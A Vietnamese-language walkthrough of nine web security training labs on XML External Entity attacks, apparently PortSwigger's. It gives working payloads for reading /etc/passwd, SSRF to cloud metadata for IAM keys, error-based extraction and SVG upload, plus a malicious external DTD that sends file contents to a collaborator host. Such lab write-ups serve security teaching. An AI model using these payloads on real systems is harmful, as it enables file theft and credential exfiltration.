**Lab: Exploiting XXE using external entities to retrieve files**

![alt text](images/1.png)

Đề bài yêu cầu khai thác lỗ hổng XML External Entity (XXE) trong tính năng kiểm tra kho hàng để đọc nội dung file `/etc/passwd`.

Truy cập vào bài lab ta thấy giao diện trang bán hàng quen thuộc. Ta chọn một sản phẩm và sử dụng chức năng Check stock.

![alt text](images/2.png)

Bắt request của tính năng Check stock, ta thấy dữ liệu được gửi lên server ở định dạng XML.

![alt text](images/3.png)

Ta thêm một khai báo DTD (Document Type Definition) để định nghĩa thực thể bên ngoài `xxe` trỏ tới file `/etc/passwd`, sau đó gọi thực thể `&xxe;` vào bên trong thẻ `<productId>`.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

Gửi request đi, server phân tích cú pháp XML và trả về nội dung của file `/etc/passwd`.

![alt text](images/4.png)

Vậy là hoàn thành bài lab này.

-----------------------------------------------------------------

**Lab: Exploiting XXE to perform SSRF attacks**

![alt text](images/5.png)

Bài lab này yêu cầu tận dụng lỗ hổng XXE để thực hiện một cuộc tấn công SSRF (Server-Side Request Forgery) truy cập vào dịch vụ metadata đám mây tại `http://169.254.169.254/` nhằm trích xuất IAM secret access key.

Vào lab ta tiếp tục kiểm tra tính năng Check stock của sản phẩm.

![alt text](images/6.png)

Bắt request XML kiểm tra số lượng sản phẩm trong kho.

![alt text](images/7.png)

Đầu tiên ta dùng Burp Collaborator tạo một URL để kiểm tra xem server có thực hiện gọi ra bên ngoài hay không.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://1np2eywyjvhk76e1itb5d9d87zdq1gp5.oastify.com"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

Kết quả trả về phản hồi chứa nội dung của Collaborator, và bên tab Burp Collaborator cũng nhận được request HTTP gửi tới.

![alt text](images/8.png)
![alt text](images/9.png)

Sau khi xác định server cho phép gọi ra ngoài, ta đổi URL trong khai báo DTD trỏ tới `http://169.254.169.254/`. Server trả về các đường dẫn con như `latest`. Ta tiếp tục duyệt sâu theo các thư mục metadata cho đến đường dẫn chứa thông tin xác thực AWS.

![alt text](images/10.png)

Server trả về đầy đủ IAM secret access key trong phản hồi.

Vậy là hoàn thành lab.

-----------------------------------------------------------------

**Lab: Blind XXE with out-of-band interaction**

![alt text](images/11.png)

Đề bài yêu cầu khai thác lỗ hổng Blind XXE để kích hoạt một tương tác ngoài băng thông (out-of-band) tới Burp Collaborator.

Truy cập vào trang sản phẩm và kiểm tra chức năng Check stock.

![alt text](images/12.png)

Request XML của tính năng Check stock có cấu trúc gồm hai thẻ `<productId>` và `<storeId>`.

![alt text](images/13.png)

Khi ta khai báo thực thể bên ngoài và chèn vào `<productId>` thì server thông báo `Invalid product ID`.

![alt text](images/14.png)

Nếu chèn vào `<storeId>` thì server chỉ phản hồi số lượng sản phẩm chứ không trả về dữ liệu của thực thể.

![alt text](images/15.png)

Vì không thể nhận dữ liệu phản hồi trực tiếp, ta chuyển sang kỹ thuật Blind XXE bằng cách trỏ thực thể tới địa chỉ Burp Collaborator.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://qzv3r3f5v6j4o5b1itb5d9d87zdq1gp5.oastify.com"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

Gửi request rồi chuyển sang tab Burp Collaborator kiểm tra, ta thấy đã có các truy vấn DNS và HTTP được gửi tới từ server mục tiêu.

![alt text](images/16.png)

Vậy là hoàn thành lab.

-----------------------------------------------------------------

**Lab: Blind XXE with out-of-band interaction via XML parameter entities**

![alt text](images/17.png)

Trong bài này, server đã chặn việc sử dụng các thực thể XML thông thường trong nội dung tài liệu. Đề bài yêu cầu sử dụng XML parameter entity để kích hoạt tương tác DNS và HTTP tới Burp Collaborator.

Truy cập vào lab và bắt request Check stock.

![alt text](images/18.png)

Ta định nghĩa một parameter entity bằng cú pháp `%` bên trong khối DTD và tham chiếu thực thể đó ngay trong DTD thay vì trong thân XML.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://snjtepwpjmhb7xesikbwd0dz7qdh1apz.oastify.com"> %xxe; ]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

Server trả về lỗi cú pháp XML parsing error.

![alt text](images/19.png)

Tuy nhiên trình phân tích cú pháp XML vẫn đã nạp và phân giải URL trước khi báo lỗi. Kiểm tra tab Burp Collaborator ta thấy các truy vấn từ server đã được ghi nhận.

![alt text](images/20.png)

Vậy là hoàn thành bài lab này.

-----------------------------------------------------------------

**Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD**

![alt text](images/21.png)

Mục tiêu của bài lab này là khai thác Blind XXE kết hợp với một tệp DTD độc hại lưu trữ bên ngoài để trích xuất nội dung file `/etc/hostname`.

Ta mở giao diện Exploit Server được cung cấp sẵn trong bài lab.

![alt text](images/22.png)

Ta tạo một file DTD độc hại với tên `exploit.dtd` trên Exploit Server. File này sẽ đọc nội dung file `/etc/hostname` và gắn vào tham số URL gửi đến Burp Collaborator.

```xml
<!ENTITY % read SYSTEM "file:///etc/hostname">
<!ENTITY % make_mal "<!ENTITY &#x25; retrieve SYSTEM 'http://4355u1c1zyxnn9u4ywr8tctbn2tthn5c.oastify.com/x=%read;'>">
%make_mal;
%retrieve;
```

![alt text](images/23.png)

Trong request Check stock, ta thêm khai báo nạp tệp DTD độc hại từ Exploit Server.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % steal SYSTEM "https://exploit-0abd003d033b988484fdbdf9012400a8.exploit-server.net/exploit.dtd"> %steal;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

![alt text](images/24.png)

Chuyển sang tab Burp Collaborator, ta thấy request HTTP gửi về chứa chuỗi `/x=7e94fa01b562`. Ta trích xuất được hostname là `7e94fa01b562`, điền đáp án để hoàn thành bài lab.

![alt text](images/25.png)

-----------------------------------------------------------------

**Lab: Exploiting blind XXE to retrieve data via error messages**

![alt text](images/26.png)

Bài lab yêu cầu kích hoạt thông báo lỗi của trình phân tích XML để làm lộ nội dung tệp tin `/etc/passwd`.

Ta truy cập vào Exploit Server để chuẩn bị tệp DTD.

![alt text](images/27.png)

Tạo file `exploit.dtd` trên Exploit Server với nội dung đọc file `/etc/passwd` rồi cố tình gọi tới một đường dẫn không tồn tại chứa nội dung file đó (`file:///nonexistent/%file;`).

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; boom SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%boom;
```

![alt text](images/28.png)

Bây giờ ta gửi request Check stock kèm khai báo nạp tệp DTD bên ngoài từ Exploit Server.

![alt text](images/29.png)

Khi server xử lý tệp DTD, do đường dẫn không tồn tại nên parser đã trả về thông báo lỗi chi tiết kèm theo toàn bộ nội dung của file `/etc/passwd`.

![alt text](images/30.png)

Vậy là hoàn thành bài lab này.

-----------------------------------------------------------------

**Lab: Exploiting XXE to retrieve data by repurposing a local DTD**

![alt text](images/31.png)

Bài lab này đặt trong tình huống hệ thống chặn hoàn toàn các kết nối ra ngoài (out-of-band), nhưng ta có thể tái sử dụng một tệp DTD cục bộ có sẵn trên hệ thống Linux (cụ thể là `/usr/share/yelp/dtd/docbookx.dtd`) và ghi đè thực thể `ISOamso`.

Mục tiêu là trích xuất file `/etc/passwd`.

![alt text](images/32.png)

Ta chèn payload vào request XML để tái sử dụng tệp DTD cục bộ, đồng thời định nghĩa lại thực thể để gây lỗi và in nội dung file ra màn hình:

```xml
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
'>
    %local_dtd;
]>
```

![alt text](images/33.png)

Server nạp DTD cục bộ, thực thi chuỗi thực thể và trả về thông báo lỗi chứa nội dung file `/etc/passwd`.

![alt text](images/34.png)

Vậy là hoàn thành bài lab này.

-----------------------------------------------------------------

**Lab: Exploiting XInclude to retrieve files**

![alt text](images/35.png)

Bài lab này yêu cầu đọc nội dung file `/etc/passwd` nhưng ứng dụng chỉ cho phép người dùng nhập vào một tham số đơn lẻ chứ không kiểm soát toàn bộ tài liệu XML. Trong trường hợp này ta sử dụng tính năng XInclude.

Bắt request kiểm tra kho hàng, dữ liệu gửi lên là dạng URL-encoded gồm `productId` và `storeId`.

![alt text](images/36.png)

Ta chèn đoạn mã XInclude vào giá trị của tham số `productId` để nạp file `/etc/passwd`:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

![alt text](images/37.png)

Gửi request đi, server giải mã XML và nhúng trực tiếp nội dung file `/etc/passwd` vào phản hồi.

![alt text](images/38.png)

Vậy là hoàn thành lab.

-----------------------------------------------------------------

**Lab: Exploiting XXE via image file upload**

![alt text](images/39.png)

Đề bài yêu cầu lấy nội dung file `/etc/hostname` thông qua chức năng upload ảnh đại diện bằng cách tải lên một file ảnh định dạng vector SVG có chứa payload XXE.

Truy cập vào bài lab ta thấy phần bình luận cho phép người dùng đính kèm file ảnh đại diện.

![alt text](images/40.png)

Ta tạo một file ảnh SVG chứa định nghĩa XML External Entity trỏ tới file `/etc/hostname`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="50">&xxe;</text>
</svg>
```

![alt text](images/41.png)

Tiến hành gửi bình luận và upload file SVG vừa tạo. Server chấp nhận và trả về mã 302 Found.

![alt text](images/42.png)

Quay lại bài viết xem danh sách bình luận, ảnh đại diện đã được hiển thị.

![alt text](images/43.png)

Mở trực tiếp file ảnh avatar vừa upload lên tab mới, ta thấy nội dung hostname `4aa62ae6deea` đã được render lên ảnh. Nhập hostname vào phần Submit solution để hoàn thành lab.

![alt text](images/44.png)

Vậy là hoàn thành bài lab này.

